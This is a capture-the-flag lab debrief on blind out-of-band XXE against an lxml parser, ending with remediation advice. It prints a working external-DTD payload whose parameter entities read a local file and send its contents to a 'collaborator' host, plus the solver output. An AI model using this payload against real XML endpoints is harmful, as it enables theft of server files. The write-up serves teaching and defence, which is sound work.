# The Silent Courier, Debrief

**Node:** `p5_5` &middot; **Flag:** `SEIYAKU{entity_phoned_home}` &middot; **Route:** `POST /p5/courier` &middot; **Sink:** `core/xml_parser.parse()`, same `resolve_entities=True`/`load_dtd=True`/`no_network=False` configuration as p5_4, but no route-level reflection &middot; **Signal:** not in this route's HTTP response — in the collaborator's capture log, reached via `GET /p5/courier/captures`

## Why this is a genuinely different bug shape from p5_4

p5_4 (The King's Sealed Archives) was **reflected XXE**: the route echoed
`title_el.text` back in its own response:

```python
title_el = doc.find(".//document")
document_title = title_el.text if title_el is not None else None
# ...
return jsonify(document_title=document_title, ...)
```

A `SYSTEM` entity whose value was the contents of `/opt/king/flag.txt`
was therefore readable directly from the HTTP response. The route did
the work of carrying the exfiltrated data back to the attacker, with no
special mechanism needed on the attacker's side.

This floor removes that reflection entirely. The route's response after a
successful parse is always:

```json
{"dispatched": true, "error": null}
```

Nothing from the parsed document appears. Nothing from any resolved
entity appears. Whatever happened during the parse call, its data side
effects are invisible to the caller through this channel. That is the
blind case that p5_4 was not.

The parser configuration has not changed:

```python
# core/xml_parser.py (unchanged)
parser = etree.XMLParser(
    resolve_entities=True,
    load_dtd=True,
    no_network=False,
    huge_tree=False,
)
```

What changed is what the route does with the parse result. The
vulnerability is exactly the same; the in-band channel to read it is
gone.

## Why external DTDs, not internal entities

An internal SYSTEM entity (one declared inside the document's own
DOCTYPE, `<!DOCTYPE ... [ <!ENTITY xxe SYSTEM "file://..."> ]>`) can
make the parser resolve the file reference, but it has two problems
here:

1. The resolved content ends up in the entity's value, waiting to be
   used somewhere. If the route never references that entity in any
   element it then echoes, the content just disappears.
2. Making the resolved content trigger a *second* network request (the
   exfil hit) is not possible with a regular internal entity, because
   you can't use a regular entity's value inside another entity's
   SYSTEM identifier in an internal DTD subset.

External **parameter** entities work around both. A parameter entity
declared in an external DTD can be referenced in other entity
declarations *inside* that same external DTD, something the XML spec
explicitly allows in external subsets but forbids in internal ones. This
is the technical foundation of the exfil chain.

## The exfil chain, step by step

**Main payload sent to `/p5/courier`:**

```xml
<?xml version="1.0"?>
<!DOCTYPE courier [
  <!ENTITY % remote SYSTEM "http://collaborator/evil.dtd?f=/opt/king/dispatch.txt">
  %remote;
]>
<courier><mission>ping</mission></courier>
```

`%remote;` causes the parser to make an outbound HTTP request to the
collaborator, fetching the external DTD. The route's response has
already been determined by the time `%remote;` expanded — it will say
`dispatched: true` — the route itself is completely unaware this fetch
happened.

**External DTD served by `collaborator` at `/evil.dtd?f=/opt/king/dispatch.txt`:**

```xml
<!ENTITY % file SYSTEM "file:///opt/king/dispatch.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://collaborator/exfil?d=%file;'>">
%eval;
%exfil;
```

Line by line:

- `%file;` is a parameter entity whose `SYSTEM` reference reads the
  target file. Its resolved value is `SEIYAKU{entity_phoned_home}`.

- `%eval;` is a parameter entity whose value is the string
  `<!ENTITY % exfil SYSTEM 'http://collaborator/exfil?d=%file;'>`.
  `&#x25;` is the XML character reference for `%`. A literal `%` inside
  a quoted parameter-entity value would be interpreted as a parameter
  entity reference start, which is not allowed in that position in an
  internal subset; character-encoding it works here because this
  content is in an *external* DTD, re-parsed with looser rules.

- Expanding `%eval;` creates a new parameter entity `%exfil;` whose
  `SYSTEM` identifier has `%file;`'s value substituted in:
  `http://collaborator/exfil?d=SEIYAKU{entity_phoned_home}`.

- Expanding `%exfil;` fires a network request to that URL.

**How this lab implements the network call.** The XML spec describes the
intent; this lab runs on lxml 6.1.3 / libxml2 2.14.6. Modern libxml2
builds have tightened conformance and do not natively fire HTTP requests
for parameter entity SYSTEM references during DTD processing. This lab
bridges that gap with a custom `etree.Resolver` subclass (`_OOBResolver`
in `challenges/phase5.py`) that lxml calls for every SYSTEM reference the
parser encounters, regardless of scheme:

- When called for `http://` URLs: fetches the external DTD over the
  network, enabling the `%remote;` → external-DTD step.
- When called for `file://` URLs: reads the file and fires
  `GET http://collaborator/exfil?d=<contents>` before returning the
  content to the parser. This is the exfil moment — it happens inside
  the parse call, before the route's business logic sees anything.

This is the realistic Python OOB XXE model: Python applications that
have XXE vulnerabilities typically have *some* mechanism for enabling
entity resolution (often a custom resolver or a library that wraps
network access), and that mechanism is exactly what makes the exfil
possible. The fundamental attack is the same regardless of whether
libxml2's internal HTTP client or a Python `requests` call makes the
outbound request.

**Polling the captures:**

```bash
curl -s http://localhost:8000/p5/courier/captures | python3 -m json.tool
```

Look for an entry with `"path": "/exfil"` and read `query.d[0]`:

```json
{
  "type": "http",
  "method": "GET",
  "path": "/exfil",
  "query": {"d": ["SEIYAKU{entity_phoned_home}"]},
  ...
}
```

## Full live walk (solver output)

`solvers/p5_5.py` automates the full chain. Actual, unedited output of a
real run against this stack:

```
[p5_5] target: http://localhost:8000/p5/courier
[p5_5] step 1: send OOB XXE payload
  ok: dispatch confirmed — no flag in response (the desk never echoes)
      the flag left via a different channel; polling captures now
[p5_5] step 2: poll /p5/courier/captures for /exfil entry
  ok: /exfil hit captured: d='SEIYAKU{entity_phoned_home}'
[p5_5] recovered flag: SEIYAKU{entity_phoned_home}
  ok: recovered flag matches: SEIYAKU{entity_phoned_home}
[p5_5] ok: blind OOB XXE via external DTD + collaborator exfil channel
[p5_5] PASS
```

## Why `&#x25;` and not a literal `%`

The XML spec (§4.4.8) prohibits a parameter-entity reference inside a
parameter-entity value in an **internal** DTD subset. This is why the
same technique attempted inside a document's own `<!DOCTYPE ...
[...]>` block would fail: `%file;` inside the string value of `%eval;`
would be a syntax error there.

External DTD subsets have a different rule (§4.4.5): parameter entities
can be referenced in entity declarations, which is exactly what allows
`%file;` to expand inside `%eval;`'s value when that value is interpreted
in the external DTD context. `&#x25;` is the bridge: it represents the
`%` character as a character reference rather than a PERef, so the
*outer* parser (processing `%eval;`'s string value as an internal entity
value at definition time) does not try to interpret it as a reference,
but when `%eval;` is later expanded in the external DTD context and its
string value is re-parsed as markup, that `&#x25;` becomes a `%`, now in
the right context to start the `%exfil;` declaration correctly.

## HxH analogy

A silent courier does exactly what this route does: they carry the
message, confirm they received it, and never tell the sender what was in
the envelope. What the carrier does on the route — which roads, which
checkpoints, which side messages — is invisible to both parties. This
floor's parser is that courier: it fetched a file, resolved a chain of
entities, and sent a network request to a listener the route's author
never knew existed. The confirmation the route sent back carried none of
that. The trace only exists at the listener, waiting.

## Remediation

- **Disable external entities and DTD loading at the parser level.**
  This is the only correct fix for XXE, reflected or blind:

  ```python
  parser = etree.XMLParser(
      resolve_entities=False,
      load_dtd=False,
      no_network=True,
  )
  ```

  The fact that this route never echoes parsed content back does not
  make it safe. The blind case is merely harder to observe; the parser
  still makes real outbound network requests and reads real local files.
  A route that reflects nothing today may be changed to reflect
  something tomorrow, or may expose data through timing, error messages,
  or other side channels that weren't considered. The fix is at the
  parser, not in the route.

- **Understand why "no echo" is not a sufficient defense.** This floor
  exists specifically to teach that blind XXE is real, exploitable
  without any in-band feedback, and finds in production systems all the
  time precisely because developers believe that since the response
  contains nothing interesting, the parser's entity resolution is
  harmless.

- **Never allow user-supplied XML to reach a parser with DTD/entity
  resolution enabled.** If XML is accepted as input, strip or reject
  the DOCTYPE declaration at the application layer before parsing, and
  use a hardened parser configuration (`load_dtd=False`,
  `resolve_entities=False`, `no_network=True`) as the default for every
  route. The unsafe configuration should require a named, specific
  justification to deviate from.
